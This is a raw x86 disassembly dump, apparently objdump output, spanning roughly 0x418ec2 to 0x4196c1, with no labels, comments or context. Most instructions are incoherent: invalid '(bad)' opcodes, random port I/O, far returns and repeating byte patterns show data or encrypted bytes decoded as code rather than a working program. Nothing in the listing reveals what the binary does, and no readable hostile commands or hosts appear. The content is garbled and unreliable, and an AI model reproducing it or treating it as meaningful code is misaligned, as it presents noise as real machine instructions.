  418ec2:	inc    eax
  418ec3:	inc    ecx
  418ec4:	and    BYTE PTR [edx],ch
  418ec6:	or     eax,0x7c116958
  418ecb:	or     eax,0xbfcb463c
  418ed0:	push   0xdcb1223
  418ed5:	push   eax
  418ed6:	inc    ebx
  418ed7:	(bad)  [edi-0x2d]
  418eda:	xor    BYTE PTR [ebp-0x35],al
  418edd:	jbe    0x418f46
  418edf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418ee0:	loope  0x418f19
  418ee2:	popa   
  418ee3:	inc    eax
  418ee4:	adc    BYTE PTR [esp+edi*1-0x44],bh
  418ee8:	(bad)  [edx]
  418eea:	mov    bl,0x28
  418eec:	test   BYTE PTR [ebx+0x45],ch
  418eef:	dec    ebx
  418ef0:	shl    DWORD PTR [edx],0xbd
  418ef3:	in     al,dx
  418ef4:	add    eax,0x41304041
  418ef9:	inc    eax
  418efa:	inc    eax
  418efb:	inc    ebx
  418efc:	int3   
  418efd:	add    BYTE PTR ds:0x56240,al
  418f03:	inc    ebx
  418f04:	inc    eax
  418f05:	inc    eax
  418f06:	add    BYTE PTR [ecx+0x62],al
  418f09:	bound  eax,QWORD PTR [eax]
  418f0b:	int3   
  418f0c:	inc    eax
  418f0d:	inc    ebx
  418f0e:	add    eax,0x43624041
  418f13:	adc    BYTE PTR [ecx+0x5],al
  418f16:	inc    eax
  418f17:	xchg   DWORD PTR [ecx],esp
  418f19:	pusha  
  418f1a:	push   edx
  418f1b:	retf   
  418f1c:	cld    
  418f1d:	mov    ecx,0x71608a43
  418f22:	lds    eax,FWORD PTR [ebx+0x43]
  418f25:	outs   dx,BYTE PTR ds:[esi]
  418f26:	xor    al,0x26
  418f28:	pop    ecx
  418f29:	imul   ecx,DWORD PTR [edi+0x61],0x60
  418f2d:	push   esp
  418f2e:	xor    al,0x64
  418f30:	inc    esp
  418f31:	repz inc edx
  418f33:	bound  eax,QWORD PTR [ebx+0x40]
  418f36:	adc    BYTE PTR ds:0x4158cc40,al
  418f3c:	inc    ebx
  418f3d:	bound  eax,QWORD PTR [ecx+0x40]
  418f40:	add    eax,0x4140
  418f45:	and    eax,0x40400062
  418f4a:	add    eax,0x84404340
  418f4f:	int3   
  418f50:	js     0x418f52
  418f52:	inc    ecx
  418f53:	adc    BYTE PTR [edx+0xf],ah
  418f56:	pusha  
  418f57:	or     al,0x40
  418f59:	mov    esi,0x2e51b2ae
  418f5e:	imul   eax,DWORD PTR [ecx-0x7],0x4b
  418f62:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418f63:	mov    al,ds:0xfd84d5f7
  418f68:	outs   dx,DWORD PTR ds:[esi]
  418f69:	xchg   edx,eax
  418f6a:	cli    
  418f6b:	inc    ecx
  418f6c:	mov    BYTE PTR [ebp+ecx*1+0x75],0xf7
  418f71:	inc    ebx
  418f72:	lods   al,BYTE PTR ds:[esi]
  418f73:	push   eax
  418f74:	jg     0x418ff1
  418f76:	leave  
  418f77:	outs   dx,DWORD PTR ds:[esi]
  418f78:	dec    edi
  418f79:	in     al,dx
  418f7a:	sub    eax,0xecb47878
  418f7f:	cld    
  418f80:	push   eax
  418f81:	dec    ebx
  418f82:	sbb    edx,ecx
  418f84:	repz add eax,0x4140000d
  418f8a:	inc    eax
  418f8b:	inc    ebx
  418f8c:	bound  ax,DWORD PTR ds:0x40434100
  418f93:	add    eax,0x40054062
  418f98:	bound  eax,QWORD PTR [ecx+0x40]
  418f9b:	inc    ebx
  418f9c:	inc    eax
  418f9d:	add    eax,0x25405841
  418fa2:	bound  eax,QWORD PTR [eax+0x43]
  418fa5:	inc    eax
  418fa6:	adc    BYTE PTR [ebx-0x4],ah
  418fa9:	les    esp,FWORD PTR [esp+ebx*1+0x35]
  418fad:	retf   
  418fae:	retf   
  418faf:	or     edi,esi
  418fb1:	pop    esp
  418fb2:	pop    es
  418fb3:	nop
  418fb4:	push   ebp
  418fb5:	mov    esp,0x4b6241ec
  418fba:	mov    ds:0x5155870,eax
  418fbf:	std    
  418fc0:	sub    eax,ebp
  418fc2:	xlat   BYTE PTR ds:[ebx]
  418fc3:	xor    ah,dh
  418fc5:	inc    ebp
  418fc6:	leave  
  418fc7:	dec    ebp
  418fc8:	xor    eax,DWORD PTR [edi-0x1f]
  418fcb:	rol    BYTE PTR [edi*1+0x40c960b0],1
  418fd2:	inc    ecx
  418fd3:	inc    ebx
  418fd4:	inc    eax
  418fd5:	add    eax,0x43406262
  418fda:	inc    ecx
  418fdb:	adc    BYTE PTR [eax],al
  418fdd:	inc    eax
  418fde:	add    eax,0x43000562
  418fe3:	add    BYTE PTR [ecx+0x40],al
  418fe6:	inc    eax
  418fe7:	add    eax,0x400062
  418fec:	inc    ebx
  418fed:	inc    eax
  418fee:	js     0x419031
  418ff0:	inc    ecx
  418ff1:	bound  eax,QWORD PTR [eax+0x38]
  418ff4:	or     ch,BYTE PTR [ebp-0x42]
  418ff7:	add    al,0x5
  418ff9:	outs   dx,DWORD PTR ds:[esi]
  418ffa:	inc    ebp
  418ffb:	xor    BYTE PTR [edi],ch
  418ffd:	js     0x41903f
  418fff:	bound  ebp,QWORD PTR [ebx-0x24]
  419002:	cmp    BYTE PTR [ebx+edx*4-0x7365ab50],bl
  419009:	mov    ah,0xf
  41900b:	dec    ebx
  41900c:	push   esp
  41900d:	adc    edx,DWORD PTR [eax-0x3c]
  419010:	dec    edx
  419011:	lods   al,BYTE PTR ds:[esi]
  419012:	xor    dh,ah
  419014:	cs pop esi
  419016:	aas    
  419017:	dec    edi
  419018:	and    esp,DWORD PTR [edi-0x71]
  41901b:	bound  eax,QWORD PTR [eax+0x5]
  41901e:	inc    ecx
  41901f:	add    BYTE PTR [ebx+0x40],al
  419022:	inc    eax
  419023:	inc    ecx
  419024:	inc    eax
  419025:	inc    eax
  419026:	bound  eax,QWORD PTR ds:0x5624300
  41902c:	add    BYTE PTR [eax+0x40],al
  41902f:	add    BYTE PTR [ecx+0x43],al
  419032:	add    BYTE PTR [eax+0x41],al
  419035:	add    eax,0x40436200
  41903a:	inc    eax
  41903b:	add    eax,0x90031362
  419040:	push   eax
  419041:	inc    eax
  419042:	sub    al,0x79
  419044:	dec    esp
  419045:	shl    bh,1
  419047:	pusha  
  419048:	aas    
  419049:	inc    eax
  41904a:	in     al,dx
  41904b:	and    BYTE PTR [eax+0x34ea4c41],ch
  419051:	add    DWORD PTR [ecx+0x40],eax
  419054:	add    eax,0x41624340
  419059:	test   BYTE PTR [eax],al
  41905b:	and    eax,0x404043
  419060:	add    BYTE PTR ds:0x626210,al
  419066:	add    eax,0x43404140
  41906b:	inc    eax
  41906c:	inc    ecx
  41906d:	add    eax,0x10664062
  419072:	inc    ebx
  419073:	bound  edx,QWORD PTR ds:0x2c185064
  419079:	push   eax
  41907a:	push   edi
  41907b:	nop
  41907c:	leave  
  41907d:	pushf  
  41907e:	icebp  
  41907f:	jb     0x419072
  419081:	xor    esi,DWORD PTR [ecx-0x48]
  419084:	nop
  419085:	sub    BYTE PTR [eax+0x41cc056c],ah
  41908b:	inc    eax
  41908c:	add    BYTE PTR [eax],al
  41908e:	add    BYTE PTR [eax+0x40],al
  419091:	inc    ebx
  419092:	bound  eax,QWORD PTR [eax]
  419094:	inc    eax
  419095:	inc    eax
  419096:	add    eax,0x62434162
  41909b:	inc    eax
  41909c:	js     0x4190ae
  41909e:	inc    ecx
  41909f:	add    eax,0x5404325
  4190a4:	bound  eax,QWORD PTR [eax+0x40]
  4190a7:	inc    ecx
  4190a8:	inc    ebx
  4190a9:	test   DWORD PTR [ebx-0x16],edi
  4190ac:	inc    ebp
  4190ad:	inc    ecx
  4190ae:	push   esp
  4190af:	adc    eax,0x96714c4a
  4190b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4190b5:	push   ebx
  4190b6:	adc    eax,0x706299cb
  4190bb:	or     DWORD PTR [eax+eiz*1+0x25739ccb],edi
  4190c2:	inc    ecx
  4190c3:	bound  eax,QWORD PTR [ebx+0x0]
  4190c6:	adc    BYTE PTR [eax+0x0],al
  4190c9:	add    eax,0x62410040
  4190ce:	inc    eax
  4190cf:	add    BYTE PTR [ebx-0x34],al
  4190d2:	inc    eax
  4190d3:	add    eax,0x78434040
  4190d8:	bound  eax,QWORD PTR [ecx+0x78]
  4190db:	add    eax,0x62404043
  4190e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4190e1:	push   ecx
  4190e2:	inc    edi
  4190e3:	outs   dx,DWORD PTR ds:[esi]
  4190e4:	nop
  4190e5:	mov    esp,0x620d4a05
  4190ea:	mov    bh,0x17
  4190ec:	or     eax,0x62d9cb05
  4190f1:	xchg   edi,eax
  4190f2:	lods   eax,DWORD PTR ds:[esi]
  4190f3:	hlt    
  4190f4:	jns    0x419139
  4190f6:	dec    eax
  4190f7:	adc    eax,0x635a4440
  4190fc:	mov    al,0x44
  4190fe:	inc    ebx
  4190ff:	xor    eax,0x1f51d3fd
  419104:	or     eax,0x4242ec44
  419109:	inc    eax
  41910a:	dec    esi
  41910b:	and    BYTE PTR [ebx-0x29],ch
  41910e:	inc    ecx
  41910f:	inc    eax
  419110:	add    eax,0x43436240
  419115:	add    eax,0x62004040
  41911a:	inc    eax
  41911b:	add    BYTE PTR [ecx+0x40],al
  41911e:	inc    ebx
  41911f:	test   BYTE PTR ds:0x58054041,ah
  419125:	inc    eax
  419126:	inc    eax
  419127:	bound  eax,QWORD PTR [eax+0x66]
  41912a:	inc    ecx
  41912b:	inc    eax
  41912c:	add    eax,0xe64ca000
  419131:	lock mov al,0x63
  419134:	mov    eax,es
  419136:	adc    eax,0x6021df3d
  41913b:	mov    ebp,0xc353630d
  419140:	add    DWORD PTR [eax-0x17],0xffffffc4
  419144:	retf   
  419145:	int3   
  419146:	pushf  
  419147:	sbb    esi,DWORD PTR [ebp-0x10]
  41914a:	push   ebx
  41914b:	dec    edi
  41914c:	inc    esi
  41914d:	test   al,0x5
  41914f:	inc    esp
  419150:	fidivr WORD PTR [ebp+0x11402846]
  419156:	inc    ebx
  419157:	inc    ebx
  419158:	bound  esp,QWORD PTR [edi]
  41915a:	jb     0x41919f
  41915c:	je     0x4191aa
  41915e:	fldcw  WORD PTR [eax]
  419160:	mov    ebx,0x69622d31
  419165:	add    BYTE PTR [eax],al
  419167:	inc    ebx
  419168:	inc    eax
  419169:	bound  eax,QWORD PTR ds:0x25404110
  41916f:	add    ah,cl
  419171:	inc    ebx
  419172:	add    eax,0x40402562
  419177:	add    BYTE PTR [eax+0x40],al
  41917a:	inc    ecx
  41917b:	inc    ecx
  41917c:	add    eax,0x78434025
  419181:	bound  eax,QWORD PTR [eax-0x7c]
  419184:	inc    eax
  419185:	inc    ecx
  419186:	inc    ecx
  419187:	dec    edx
  419188:	push   eax
  419189:	pop    ds
  41918a:	shl    edx,1
  41918c:	test   DWORD PTR [ebx+esi*4+0x413f4344],0x2405abd3
  419197:	jmp    FWORD PTR [ecx]
  419199:	leave  
  41919a:	jo     0x419163
  41919c:	inc    edx
  41919d:	xchg   DWORD PTR [edi+ecx*2+0x3f39ac35],edi
  4191a4:	stos   DWORD PTR es:[edi],eax
  4191a5:	inc    eax
  4191a6:	mov    bl,0x41
  4191a8:	inc    eax
  4191a9:	inc    eax
  4191aa:	inc    ebx
  4191ab:	int3   
  4191ac:	add    BYTE PTR ds:0x56240,al
  4191b2:	inc    ebx
  4191b3:	inc    eax
  4191b4:	inc    eax
  4191b5:	add    BYTE PTR [ecx+0x62],al
  4191b8:	bound  eax,QWORD PTR [eax]
  4191ba:	int3   
  4191bb:	inc    eax
  4191bc:	inc    ebx
  4191bd:	add    eax,0x43624041
  4191c2:	adc    BYTE PTR [ecx+0x5],al
  4191c5:	inc    eax
  4191c6:	push   eax
  4191c7:	sbb    ebx,eax
  4191c9:	and    BYTE PTR [ebx+0x49c541b4],bl
  4191cf:	inc    ebx
  4191d0:	jmp    0x4191c3
  4191d2:	inc    edi
  4191d3:	add    eax,0xcaf9632f
  4191d8:	jle    0x4191f8
  4191da:	push   ecx
  4191db:	leave  
  4191dc:	jl     0x419212
  4191de:	and    BYTE PTR [eax+0x56],al
  4191e1:	bound  eax,QWORD PTR [ebx+0x40]
  4191e4:	adc    BYTE PTR ds:0x4158cc40,al
  4191ea:	inc    ebx
  4191eb:	bound  eax,QWORD PTR [ecx+0x40]
  4191ee:	add    eax,0x4140
  4191f3:	and    eax,0x40400062
  4191f8:	add    eax,0x84404340
  4191fd:	int3   
  4191fe:	js     0x419200
  419200:	inc    ecx
  419201:	adc    BYTE PTR [edx+0xf],ah
  419204:	xchg   ebp,eax
  419205:	inc    esi
  419206:	inc    esp
  419207:	bound  edi,QWORD PTR [edi+0x47d72a63]
  41920d:	mov    dl,0x45
  41920f:	add    eax,0xd643dfbc
  419214:	jno    0x41923c
  419216:	pop    edx
  419217:	xchg   DWORD PTR [eax],eax
  419219:	inc    eax
  41921a:	inc    ecx
  41921b:	inc    eax
  41921c:	inc    ebx
  41921d:	bound  ax,DWORD PTR ds:0x40434100
  419224:	add    eax,0x40054062
  419229:	bound  eax,QWORD PTR [ecx+0x40]
  41922c:	inc    ebx
  41922d:	inc    eax
  41922e:	add    eax,0x25405841
  419233:	bound  eax,QWORD PTR [eax+0x43]
  419236:	inc    eax
  419237:	adc    BYTE PTR [ebx],al
  419239:	shl    BYTE PTR [edx+0x3405861d],1
  41923f:	dec    edx
  419240:	arpl   WORD PTR gs:[ecx-0x1d],bx
  419244:	mov    bl,0xf3
  419246:	push   0xaba0693a
  41924b:	xchg   ebp,eax
  41924c:	das    
  41924d:	add    esp,eax
  41924f:	clc    
  419250:	cmp    al,0x15
  419252:	inc    eax
  419253:	inc    ecx
  419254:	inc    ebx
  419255:	inc    eax
  419256:	add    eax,0x43406262
  41925b:	inc    ecx
  41925c:	adc    BYTE PTR [eax],al
  41925e:	inc    eax
  41925f:	add    eax,0x43000562
  419264:	add    BYTE PTR [ecx+0x40],al
  419267:	inc    eax
  419268:	add    eax,0x400062
  41926d:	inc    ebx
  41926e:	inc    eax
  41926f:	js     0x4192b2
  419271:	inc    ecx
  419272:	bound  eax,QWORD PTR [eax-0x44]
  419275:	dec    esi
  419276:	inc    eax
  419277:	icebp  
  419278:	test   al,0x64
  41927a:	arpl   cx,cx
  41927c:	add    eax,0x127d70c7
  419281:	dec    ecx
  419282:	jmp    0x27bd5c23
  419287:	mov    bh,0x42
  419289:	arpl   WORD PTR [eax],bx
  41928b:	add    eax,0x45454758
  419290:	add    DWORD PTR [ebp-0x2f],esi
  419293:	leave  
  419294:	inc    ebx
  419295:	outs   dx,BYTE PTR ds:[esi]
  419296:	nop
  419297:	icebp  
  419298:	adc    al,0xc4
  41929a:	arpl   cx,bx
  41929c:	inc    ebx
  41929d:	jnp    0x4192d3
  41929f:	pop    esi
  4192a0:	int    0x4f
  4192a2:	jl     0x4192f4
  4192a4:	bound  eax,QWORD PTR [eax+0x5]
  4192a7:	inc    ecx
  4192a8:	add    BYTE PTR [ebx+0x40],al
  4192ab:	inc    eax
  4192ac:	inc    ecx
  4192ad:	inc    eax
  4192ae:	inc    eax
  4192af:	bound  eax,QWORD PTR ds:0x5624300
  4192b5:	add    BYTE PTR [eax+0x40],al
  4192b8:	add    BYTE PTR [ecx+0x43],al
  4192bb:	add    BYTE PTR [eax+0x41],al
  4192be:	add    eax,0x40436200
  4192c3:	inc    eax
  4192c4:	add    eax,0x30aa3062
  4192c9:	xchg   ebx,eax
  4192ca:	dec    eax
  4192cb:	inc    eax
  4192cc:	inc    eax
  4192cd:	mov    al,ds:0x9f733231
  4192d2:	or     eax,0x768162a0
  4192d7:	mov    ecx,edx
  4192d9:	jp     0x419322
  4192db:	cmp    eax,0x72a8407f
  4192e0:	ja     0x419293
  4192e2:	das    
  4192e3:	ret    
  4192e4:	ja     0x4192dd
  4192e6:	cdq    
  4192e7:	push   es
  4192e8:	inc    edx
  4192e9:	sti    
  4192ea:	push   eax
  4192eb:	mov    al,ds:0xa8274f55
  4192f0:	aad    0x53
  4192f2:	bound  eax,QWORD PTR ds:0x4111b063
  4192f8:	inc    eax
  4192f9:	add    eax,0x41624340
  4192fe:	test   BYTE PTR [eax],al
  419300:	and    eax,0x404043
  419305:	add    BYTE PTR ds:0x626210,al
  41930b:	add    eax,0x43404140
  419310:	inc    eax
  419311:	inc    ecx
  419312:	add    eax,0x10664062
  419317:	inc    ebx
  419318:	bound  ebx,QWORD PTR [edx+0x42]
  41931b:	push   edx
  41931c:	pop    eax
  41931d:	leave  
  41931e:	pop    esp
  41931f:	add    eax,0xd1dfa9e0
  419324:	xor    al,0x44
  419326:	cld    
  419327:	retf   
  419328:	or     eax,0xb84defe8
  41932d:	dec    eax
  41932e:	jne    0x41937d
  419330:	int    0xa6
  419332:	pop    edx
  419333:	push   ebx
  419334:	add    eax,0x41cc0563
  419339:	inc    eax
  41933a:	add    BYTE PTR [eax],al
  41933c:	add    BYTE PTR [eax+0x40],al
  41933f:	inc    ebx
  419340:	bound  eax,QWORD PTR [eax]
  419342:	inc    eax
  419343:	inc    eax
  419344:	add    eax,0x62434162
  419349:	inc    eax
  41934a:	js     0x41935c
  41934c:	inc    ecx
  41934d:	add    eax,0x5404325
  419352:	bound  eax,QWORD PTR [eax+0x40]
  419355:	inc    ecx
  419356:	inc    ebx
  419357:	fs inc esi
  419359:	adc    BYTE PTR [ebx],bh
  41935b:	(bad)  
  41935c:	dec    ecx
  41935d:	jns    0x419397
  41935f:	cld    
  419360:	test   al,0x54
  419362:	test   DWORD PTR [edi*8+0x67662b42],edx
  419369:	add    eax,0x4572465e
  41936e:	jp     0x4193b4
  419370:	push   eax
  419371:	retf   
  419372:	sbb    dl,BYTE PTR [edx+0x7ca8f8fd]
  419378:	clc    
  419379:	adc    cl,BYTE PTR [ebx+0x10f84c7f]
  41937f:	jno    0x4193ea
  419381:	pop    eax
  419382:	bound  eax,QWORD PTR [eax+0x33]
  419385:	and    eax,0x436241
  41938a:	adc    BYTE PTR [eax+0x0],al
  41938d:	add    eax,0x62410040
  419392:	inc    eax
  419393:	add    BYTE PTR [ebx-0x34],al
  419396:	inc    eax
  419397:	add    eax,0x78434040
  41939c:	bound  eax,QWORD PTR [ecx+0x78]
  41939f:	add    eax,0x62404043
  4193a4:	adc    ebp,eax
  4193a6:	sub    ah,BYTE PTR [ebx+0x15]
  4193a9:	pop    es
  4193aa:	pusha  
  4193ab:	daa    
  4193ac:	rol    DWORD PTR ds:0x7fcb505c,0x5b
  4193b3:	pop    ebx
  4193b4:	arpl   bx,cx
  4193b6:	push   edx
  4193b7:	or     eax,0xbf74e211
  4193bc:	imul   ebp,eax,0xd1425042
  4193c2:	sub    DWORD PTR [esi*1+0x4032ac15],esi
  4193c9:	push   0xffffffe2
  4193cb:	cmp    eax,DWORD PTR [ecx+0x40]
  4193ce:	add    eax,0x43436240
  4193d3:	add    eax,0x62004040
  4193d8:	inc    eax
  4193d9:	add    BYTE PTR [ecx+0x40],al
  4193dc:	inc    ebx
  4193dd:	test   BYTE PTR ds:0x58054041,ah
  4193e3:	inc    eax
  4193e4:	inc    eax
  4193e5:	bound  eax,QWORD PTR [eax+0x66]
  4193e8:	inc    ecx
  4193e9:	inc    eax
  4193ea:	add    eax,0x15c96e00
  4193ef:	mov    al,ds:0x783da20c
  4193f4:	mov    ecx,0xcdc552a2
  4193f9:	push   es
  4193fa:	rcr    DWORD PTR [edi+0x4f0691c3],1
  419400:	dec    esi
  419401:	cmp    al,BYTE PTR [ecx+0x34]
  419404:	adc    BYTE PTR [eax+0xc44b28],dl
  41940a:	add    BYTE PTR [ebx+0x40],al
  41940d:	bound  eax,QWORD PTR ds:0x25404110
  419413:	add    ah,cl
  419415:	inc    ebx
  419416:	add    eax,0x40402562
  41941b:	add    BYTE PTR [eax+0x40],al
  41941e:	inc    ecx
  41941f:	inc    ecx
  419420:	add    eax,0x78434025
  419425:	bound  eax,QWORD PTR [eax-0x7c]
  419428:	inc    eax
  419429:	inc    ecx
  41942a:	mov    eax,ds:0x154c9510
  41942f:	bound  edi,QWORD PTR [eax+0x402641d0]
  419435:	test   ebx,0xb236c342
  41943b:	pop    eax
  41943c:	push   edi
  41943d:	dec    edi
  41943e:	nop
  41943f:	inc    esp
  419440:	inc    ebx
  419441:	ret    
  419442:	sub    BYTE PTR [ecx],dh
  419444:	push   ebx
  419445:	dec    eax
  419446:	or     eax,0x96a8457d
  41944b:	pop    eax
  41944c:	jg     0x419453
  41944e:	leave  
  41944f:	addr16 loopne 0x419462
  419452:	xor    DWORD PTR [ecx+0x40],eax
  419455:	inc    eax
  419456:	inc    ebx
  419457:	int3   
  419458:	add    BYTE PTR ds:0x56240,al
  41945e:	inc    ebx
  41945f:	inc    eax
  419460:	inc    eax
  419461:	add    BYTE PTR [ecx+0x62],al
  419464:	bound  eax,QWORD PTR [eax]
  419466:	int3   
  419467:	inc    eax
  419468:	inc    ebx
  419469:	add    eax,0x43624041
  41946e:	adc    BYTE PTR [ecx+0x5],al
  419471:	inc    eax
  419472:	rcr    DWORD PTR [ebp+0x48],cl
  419475:	dec    ebx
  419476:	inc    eax
  419477:	inc    eax
  419478:	pop    eax
  419479:	ja     0x4194bb
  41947b:	fcmovne st,st(6)
  41947d:	test   eax,0x6b05b1d4
  419482:	xchg   edx,eax
  419483:	inc    esi
  419484:	adc    bl,al
  419486:	push   0xa93fcba9
  41948b:	adc    esp,DWORD PTR [edx+0x44]
  41948e:	inc    esp
  41948f:	inc    ebp
  419490:	inc    ecx
  419491:	pop    edx
  419492:	sbb    cl,bl
  419494:	jp     0x4194f8
  419496:	inc    ebx
  419497:	inc    eax
  419498:	adc    BYTE PTR ds:0x4158cc40,al
  41949e:	inc    ebx
  41949f:	bound  eax,QWORD PTR [ecx+0x40]
  4194a2:	add    eax,0x4140
  4194a7:	and    eax,0x40400062
  4194ac:	add    eax,0x84404340
  4194b1:	int3   
  4194b2:	js     0x4194b4
  4194b4:	inc    ecx
  4194b5:	adc    BYTE PTR [edx+0xf],ah
  4194b8:	or     BYTE PTR [ebp+esi*1+0x2a],bh
  4194bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4194bd:	xchg   ebx,eax
  4194be:	jno    0x4194f4
  4194c0:	retf   
  4194c1:	jp     0x41950a
  4194c3:	jo     0x419457
  4194c5:	popf   
  4194c6:	mov    edi,0x43a54c3f
  4194cb:	inc    edi
  4194cc:	add    BYTE PTR [eax+0x2e],dh
  4194cf:	test   BYTE PTR [eax],0x40
  4194d2:	inc    ecx
  4194d3:	inc    eax
  4194d4:	inc    ebx
  4194d5:	bound  ax,DWORD PTR ds:0x40434100
  4194dc:	add    eax,0x40054062
  4194e1:	bound  eax,QWORD PTR [ecx+0x40]
  4194e4:	inc    ebx
  4194e5:	inc    eax
  4194e6:	add    eax,0x25405841
  4194eb:	bound  eax,QWORD PTR [eax+0x43]
  4194ee:	inc    eax
  4194ef:	adc    BYTE PTR [edi+0x38],al
  4194f2:	imul   edi,DWORD PTR [edx],0xffffffa6
  4194f5:	shl    DWORD PTR [ecx],1
  4194f7:	bound  eax,QWORD PTR [eax+0x4f]
  4194fa:	lock int3 
  4194fc:	pop    ebx
  4194fd:	and    DWORD PTR [esi-0x48],esi
  419500:	bound  esi,QWORD PTR [ebp+eiz*4+0x1755a511]
  419507:	or     eax,0x4024a564
  41950c:	inc    ecx
  41950d:	inc    ebx
  41950e:	inc    eax
  41950f:	add    eax,0x43406262
  419514:	inc    ecx
  419515:	adc    BYTE PTR [eax],al
  419517:	inc    eax
  419518:	add    eax,0x43000562
  41951d:	add    BYTE PTR [ecx+0x40],al
  419520:	inc    eax
  419521:	add    eax,0x400062
  419526:	inc    ebx
  419527:	inc    eax
  419528:	js     0x41956b
  41952a:	inc    ecx
  41952b:	bound  eax,QWORD PTR [eax+0x35]
  41952e:	icebp  
  41952f:	add    eax,DWORD PTR [ebp-0x56c59c37]
  419535:	inc    ecx
  419536:	push   ebx
  419537:	cmc    
  419538:	xor    DWORD PTR [ecx+0x33],eax
  41953b:	inc    esp
  41953c:	inc    ebp
  41953d:	dec    esp
  41953e:	jecxz  0x419592
  419540:	ins    BYTE PTR es:[edi],dx
  419541:	test   eax,0x5406253
  419546:	inc    ecx
  419547:	add    BYTE PTR [ebx+0x40],al
  41954a:	inc    eax
  41954b:	inc    ecx
  41954c:	inc    eax
  41954d:	inc    eax
  41954e:	bound  eax,QWORD PTR ds:0x5624300
  419554:	add    BYTE PTR [eax+0x40],al
  419557:	add    BYTE PTR [ecx+0x43],al
  41955a:	add    BYTE PTR [eax+0x41],al
  41955d:	add    eax,0x40436200
  419562:	inc    eax
  419563:	add    eax,0x3d357c62
  419568:	sbb    eax,0x39c31291
  41956d:	inc    esp
  41956e:	inc    esi
  41956f:	ret    
  419570:	xchg   bl,cl
  419572:	xor    eax,0x416092b8
  419577:	fiadd  WORD PTR [ebp+0x51]
  41957a:	inc    ecx
  41957b:	inc    esp
  41957c:	inc    ecx
  41957d:	inc    eax
  41957e:	add    eax,0x41624340
  419583:	test   BYTE PTR [eax],al
  419585:	and    eax,0x404043
  41958a:	add    BYTE PTR ds:0x626210,al
  419590:	add    eax,0x43404140
  419595:	inc    eax
  419596:	inc    ecx
  419597:	add    eax,0x10664062
  41959c:	inc    ebx
  41959d:	bound  ebp,QWORD PTR [esi+0x4a4465f7]
  4195a3:	pop    ds
  4195a4:	mov    cl,0x89
  4195a6:	cmp    eax,0x5dc3e861
  4195ab:	hlt    
  4195ac:	inc    eax
  4195ad:	xor    al,0x0
  4195af:	cmp    eax,0x67ad5c3c
  4195b4:	lock (bad) 
  4195b6:	rcl    BYTE PTR [ecx-0x58],1
  4195b9:	arpl   WORD PTR [ebx],cx
  4195bb:	push   edx
  4195bc:	pusha  
  4195bd:	jmp    0xdca48d0b
  4195c2:	pop    ecx
  4195c3:	shl    BYTE PTR [esi-0x569ec9e8],1
  4195c9:	adc    ebx,edi
  4195cb:	mov    ebp,0xbe67621b
  4195d0:	push   esp
  4195d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4195d2:	xchg   BYTE PTR [ecx],dl
  4195d4:	fistp  QWORD PTR ds:0x4041cc05
  4195da:	add    BYTE PTR [eax],al
  4195dc:	add    BYTE PTR [eax+0x40],al
  4195df:	inc    ebx
  4195e0:	bound  eax,QWORD PTR [eax]
  4195e2:	inc    eax
  4195e3:	inc    eax
  4195e4:	add    eax,0x62434162
  4195e9:	inc    eax
  4195ea:	js     0x4195fc
  4195ec:	inc    ecx
  4195ed:	add    eax,0x5404325
  4195f2:	bound  eax,QWORD PTR [eax+0x40]
  4195f5:	inc    ecx
  4195f6:	inc    ebx
  4195f7:	test   al,0xa3
  4195f9:	push   ecx
  4195fa:	(bad)  
  4195fc:	mov    esi,0x2c11cc6f
  419601:	push   edx
  419602:	add    eax,0xa751bf0b
  419607:	dec    eax
  419608:	inc    esp
  419609:	mov    esp,0xc5400071
  41960e:	cmp    al,0x41
  419610:	jl     0x419617
  419612:	loop   0x419639
  419614:	inc    ecx
  419615:	bound  eax,QWORD PTR [ebx+0x0]
  419618:	adc    BYTE PTR [eax+0x0],al
  41961b:	add    eax,0x62410040
  419620:	inc    eax
  419621:	add    BYTE PTR [ebx-0x34],al
  419624:	inc    eax
  419625:	add    eax,0x78434040
  41962a:	bound  eax,QWORD PTR [ecx+0x78]
  41962d:	add    eax,0x62404043
  419632:	rol    DWORD PTR [eax+0x13],1
  419635:	sbb    eax,0xf86369ed
  41963a:	sub    edx,DWORD PTR [eax+0x1b]
  41963d:	arpl   WORD PTR [edx+ebx*4-0x7db927ca],si
  419644:	xchg   ebx,eax
  419645:	or     DWORD PTR [edx+0x34],esp
  419648:	inc    ecx
  419649:	inc    esi
  41964a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41964b:	cmovnp ecx,DWORD PTR [eax-0x4a]
  41964f:	inc    esp
  419650:	pop    edx
  419651:	mov    dh,0x8a
  419653:	inc    eax
  419654:	adc    DWORD PTR [ebx-0x3c],esp
  419657:	jl     0x419602
  419659:	(bad)  
  41965a:	stos   BYTE PTR es:[edi],al
  41965b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41965c:	pop    ecx
  41965d:	inc    ecx
  41965e:	inc    eax
  41965f:	add    eax,0x43436240
  419664:	add    eax,0x62004040
  419669:	inc    eax
  41966a:	add    BYTE PTR [ecx+0x40],al
  41966d:	inc    ebx
  41966e:	test   BYTE PTR ds:0x58054041,ah
  419674:	inc    eax
  419675:	inc    eax
  419676:	bound  eax,QWORD PTR [eax+0x66]
  419679:	inc    ecx
  41967a:	inc    eax
  41967b:	add    eax,0x75f42d00
  419680:	push   ecx
  419681:	adc    esp,esp
  419683:	loopne 0x4196f6
  419685:	pop    eax
  419686:	adc    eax,0xe1e54196
  41968b:	push   ecx
  41968c:	inc    esi
  41968d:	arpl   bp,cx
  41968f:	jo     0x419639
  419691:	cmovbe eax,DWORD PTR [eax+0x71]
  419695:	sub    ah,BYTE PTR [ecx+0x52]
  419698:	adc    cl,bh
  41969a:	stc    
  41969b:	jle    0x4196fe
  41969d:	test   eax,0x43000027
  4196a2:	inc    eax
  4196a3:	bound  eax,QWORD PTR ds:0x25404110
  4196a9:	add    ah,cl
  4196ab:	inc    ebx
  4196ac:	add    eax,0x40402562
  4196b1:	add    BYTE PTR [eax+0x40],al
  4196b4:	inc    ecx
  4196b5:	inc    ecx
  4196b6:	add    eax,0x78434025
  4196bb:	bound  eax,QWORD PTR [eax-0x7c]
  4196be:	inc    eax
  4196bf:	inc    ecx
  4196c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4196c1:	arpl   sp,dx
